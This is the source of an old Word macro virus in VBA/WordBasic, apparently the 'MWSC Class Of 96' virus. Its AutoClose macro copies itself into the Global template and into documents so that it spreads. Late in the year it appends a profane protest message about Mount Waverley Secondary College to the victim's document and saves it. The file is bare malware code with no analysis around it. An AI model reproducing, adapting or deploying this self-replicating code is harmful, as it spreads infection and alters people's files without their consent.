   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim title$
   Dim total
   Dim present
   Dim cycle
   Dim a$
   title$ = "MWSC Class Of '96"
   total = WordBasic.CountMacros(0)
   present = 0

   If total > 0 Then
       For cycle = 1 To total
           If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
               present = 1
           End If
   'End If

   a$ = WordBasic.[WindowName$]() + ":AutoClose"

   If present <> 1 Then
       WordBasic.MacroCopy a$, "Global:AutoClose"
   Else
       present = 0
       If WordBasic.CountMacros(1) <> 0 Then
           present = 1
       End If

       If present = 0 Then
           WordBasic.FileSaveAs Format:=1
           WordBasic.MacroCopy "Global:AutoClose", a$
       End If
   End If

   If WordBasic.Month(WordBasic.Now()) > 10 And WordBasic.Second(WordBasic.Now()) > 45 Then
   WordBasic.EndOfDocument
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "We are citizens of Australia."
   WordBasic.InsertPara
   WordBasic.Insert "We are youth of Victoria."
   WordBasic.InsertPara
   WordBasic.Insert "We are victims of Mount Waverley Secondary College."
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "We tolerated your discipline."
   WordBasic.InsertPara
   WordBasic.Insert "We stomached your abuse."
   WordBasic.InsertPara
   WordBasic.Insert "We bore your unprofessionalism."
   WordBasic.InsertPara
   WordBasic.Insert "We toed the line to protect the bullshit image of YOUR school."
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "We watched our friends be pressured out of your school, just so you could keep your fucking pass rate figures up."
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "And now the world will see, through the spread of this virus just how TOTALLY FUCKED UP we are!"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "Parents: yeah- go ahead send your kids to a school where about half of us use drugs. You won't see those figures in the glossy brochure."
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "This community announcement was proudly sponsored by: "
   WordBasic.InsertPara
   WordBasic.Insert "M.W.S.C. Year 12 Class Of '96. - in YOUR face."
   WordBasic.InsertPara
   WordBasic.StartOfDocument
   End If
   WordBasic.FileSave

   Next
   End If
   End Sub
